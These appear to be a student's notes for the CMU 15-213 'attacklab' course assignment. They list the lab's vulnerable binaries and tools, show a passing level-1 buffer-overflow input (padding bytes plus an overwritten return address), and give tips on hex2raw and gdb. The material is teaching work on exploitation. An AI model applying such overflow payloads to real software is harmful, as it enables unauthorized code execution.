This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

x86-64 reference: https://www.cs.cmu.edu/~fp/courses/15213-s07/misc/asm64-handout.pdf

My output:
./ctarget -q < ctarget_inputs_hex.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 C0 17 40 00

My note:
1) Run with '-q' to avoid the illegal host error.
2) Use hex2raw to generate input strings: "./hex2raw < ctarget_inputs.txt > ctarget_inputs_hex.txt"
The run in gdb with "run -q < ctarget_inputs_hex.txt"
3) Remember that string is decoded in a reverse-order in memory. E.g., "abc" would be encoded as "0x63 62 61" in memory.
4) gdb memory check manual: https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html